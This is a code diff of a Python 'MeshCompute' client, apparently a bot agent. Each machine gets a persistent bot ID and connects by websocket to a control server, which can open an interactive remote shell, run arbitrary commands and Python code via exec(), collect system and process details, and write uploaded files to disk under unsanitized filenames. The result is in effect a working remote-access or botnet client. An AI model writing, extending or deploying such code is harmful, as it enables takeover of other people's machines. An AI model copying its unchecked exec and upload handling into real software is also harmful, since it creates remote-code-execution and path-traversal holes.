@@ -7,17 +7,18 @@ import logging
 import shlex
 import os
 import socket
+import base64
+from pathlib import Path
 from dotenv import load_dotenv
-import redis.asyncio as redis
 import websockets
-from common.config import REDIS_URL, MAX_COMMAND_TIMEOUT, SERVER_URL
+from common.config import SERVER_URL, MAX_COMMAND_TIMEOUT
 
 load_dotenv()
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# Persistente Bot-ID
+# ====================== BOT ID ======================
 BOT_ID_FILE = "client/bot_id.txt"
 if os.path.exists(BOT_ID_FILE):
     with open(BOT_ID_FILE, "r") as f:
@@ -28,14 +29,15 @@ else:
     with open(BOT_ID_FILE, "w") as f:
         f.write(BOT_ID)
 
+# ====================== HELPER FUNCTIONS ======================
 async def get_system_info():
     return {
         "hostname": platform.node(),
         "os": platform.system() + " " + platform.release(),
         "python": platform.python_version(),
-        "cpu": psutil.cpu_count(logical=False),
+        "cpu_cores": psutil.cpu_count(logical=False),
         "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2),
-        "username": os.getenv("USER") or os.getenv("USERNAME"),
+        "username": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
         "cwd": os.getcwd(),
         "bot_id": BOT_ID,
         "pid": os.getpid()
@@ -45,77 +47,30 @@ async def execute_command(cmd: str, timeout=MAX_COMMAND_TIMEOUT):
     try:
         args = shlex.split(cmd)
         proc = await asyncio.create_subprocess_exec(
-            *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            *args,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
         )
         try:
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+            return {
+                "success": proc.returncode == 0,
+                "output": stdout.decode('utf-8', errors='replace'),
+                "error": stderr.decode('utf-8', errors='replace'),
+                "returncode": proc.returncode
+            }
         except asyncio.TimeoutError:
             proc.kill()
-            await proc.wait()
             return {"success": False, "error": "Command timed out"}
-        return {
-            "success": proc.returncode == 0,
-            "output": stdout.decode('utf-8', errors='replace'),
-            "error": stderr.decode('utf-8', errors='replace'),
-            "returncode": proc.returncode
-        }
     except Exception as e:
         return {"success": False, "error": str(e)}
 
-async def process_task(task: dict, r: redis.Redis):
-    task_id = task["task_id"]
-    action = task["action"]
-    payload = task.get("payload")
-    result = {
-        "type": "result",
-        "task_id": task_id,
-        "bot_id": BOT_ID
-    }
-
-    try:
-        if action == "exec":
-            res = await execute_command(payload)
-            result.update(res)
-            result["command"] = payload
-        elif action == "sysinfo":
-            result["success"] = True
-            result["info"] = await get_system_info()
-        elif action == "python":
-            try:
-                exec_globals = {}
-                exec(payload, exec_globals)
-                output = exec_globals.get("output", "Code executed (no output variable)")
-                result.update({"success": True, "output": str(output)})
-            except Exception as e:
-                result.update({"success": False, "error": str(e)})
-        elif action == "ps":
-            processes = [{"pid": p.info['pid'], "name": p.info['name'], "cpu": p.info.get('cpu_percent', 0)}
-                         for p in psutil.process_iter(['pid', 'name', 'cpu_percent'])]
-            result.update({"success": True, "processes": processes[:50]})
-        elif action == "ping":
-            result.update({"success": True, "message": "pong"})
-        else:
-            result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
-    except Exception as e:
-        result["success"] = False
-        result["error"] = str(e)
-
-    result_key = f"mesh:results:{task_id}"
-    await r.rpush(result_key, json.dumps(result))
-    await r.expire(result_key, 300)
-
+# ====================== MAIN ======================
 async def main():
-    r = None
+    print(f"🚀 MeshCompute Client gestartet → {BOT_ID}")
+
     while True:
         try:
-            if r is None:
-                r = await redis.from_url(
-                    REDIS_URL, decode_responses=True,
-                    socket_connect_timeout=10, socket_timeout=60,
-                    retry_on_timeout=True
-                )
-                await r.ping()
-
             async with websockets.connect(SERVER_URL, ping_interval=20, ping_timeout=40) as ws:
                 await ws.send(json.dumps({"type": "client", "bot_id": BOT_ID}))
                 logger.info(f"✅ Verbunden als {BOT_ID}")
@@ -123,18 +78,124 @@ async def main():
                 async for raw_msg in ws:
                     try:
                         msg = json.loads(raw_msg)
-                        if "task_id" in msg and "action" in msg:
-                            asyncio.create_task(process_task(msg, r))
+
+                        # ====================== INTERACTIVE SHELL ======================
+                        if msg.get("action") == "shell":
+                            await ws.send(json.dumps({
+                                "type": "shell_output",
+                                "output": f"Shell gestartet auf {BOT_ID}\n",
+                                "bot_id": BOT_ID
+                            }))
+
+                        elif msg.get("type") == "shell_input":
+                            command = msg.get("command", "")
+                            task_id = msg.get("task_id")
+
+                            if command.lower() in ["exit", "quit"]:
+                                await ws.send(json.dumps({
+                                    "type": "shell_exit",
+                                    "bot_id": BOT_ID,
+                                    "task_id": task_id
+                                }))
+                                continue
+
+                            # Befehl ausführen
+                            result = await execute_command(command)
+                            output = result.get("output", "")
+                            if result.get("error"):
+                                output += "\n" + result["error"]
+
+                            await ws.send(json.dumps({
+                                "type": "shell_output",
+                                "output": output,
+                                "bot_id": BOT_ID,
+                                "task_id": task_id
+                            }))
+
+                        # ====================== FILE UPLOAD ======================
+                        elif msg.get("type") == "file_upload":
+                            filename = msg.get("filename")
+                            content_b64 = msg.get("content")
+                            task_id = msg.get("task_id")
+
+                            try:
+                                data = base64.b64decode(content_b64)
+                                upload_dir = Path("uploads")
+                                upload_dir.mkdir(exist_ok=True)
+                                file_path = upload_dir / filename
+
+                                with open(file_path, "wb") as f:
+                                    f.write(data)
+
+                                await ws.send(json.dumps({
+                                    "type": "file_upload_done",
+                                    "bot_id": BOT_ID,
+                                    "task_id": task_id,
+                                    "filename": filename,
+                                    "path": str(file_path),
+                                    "size": len(data)
+                                }))
+                                logger.info(f"📁 Datei gespeichert: {file_path}")
+                            except Exception as e:
+                                logger.error(f"Upload-Fehler: {e}")
+                                await ws.send(json.dumps({
+                                    "type": "file_upload_done",
+                                    "bot_id": BOT_ID,
+                                    "task_id": task_id,
+                                    "error": str(e)
+                                }))
+
+                        # ====================== NORMALE COMMANDS ======================
+                        elif "action" in msg:
+                            action = msg["action"]
+                            task_id = msg.get("task_id")
+                            payload = msg.get("payload")
+                            result = {
+                                "type": "result",
+                                "task_id": task_id,
+                                "bot_id": BOT_ID,
+                                "action": action
+                            }
+
+                            try:
+                                if action == "exec":
+                                    res = await execute_command(payload)
+                                    result.update(res)
+                                elif action == "sysinfo":
+                                    result["success"] = True
+                                    result["info"] = await get_system_info()
+                                elif action == "python":
+                                    exec_globals = {}
+                                    exec(payload, exec_globals)
+                                    result.update({
+                                        "success": True,
+                                        "output": str(exec_globals.get("output", "Code executed"))
+                                    })
+                                elif action == "ps":
+                                    processes = [{"pid": p.info['pid'], "name": p.info['name']}
+                                                for p in psutil.process_iter(['pid', 'name'])][:30]
+                                    result.update({"success": True, "processes": processes})
+                                elif action == "ping":
+                                    result.update({"success": True, "message": "pong"})
+                                else:
+                                    result.update({"success": False, "error": f"Unbekannte Aktion: {action}"})
+                            except Exception as e:
+                                result.update({"success": False, "error": str(e)})
+
+                            await ws.send(json.dumps(result))
+
+                    except json.JSONDecodeError:
+                        continue
                     except Exception as e:
-                        logger.warning(f"Fehler beim Verarbeiten einer Nachricht: {e}")
+                        logger.warning(f"Nachrichtenverarbeitungsfehler: {e}")
 
         except websockets.exceptions.ConnectionClosed:
-            logger.warning("WebSocket Verbindung verloren → Reconnect in 3s")
+            logger.warning("Verbindung zum Server verloren → Reconnect...")
             await asyncio.sleep(3)
         except Exception as e:
-            logger.error(f"Fehler im Client: {e}")
+            logger.error(f"Verbindungsfehler: {e}")
             await asyncio.sleep(3)
 
+
 if __name__ == "__main__":
-    print(f"MeshCompute Client gestartet → {BOT_ID}")
     asyncio.run(main())
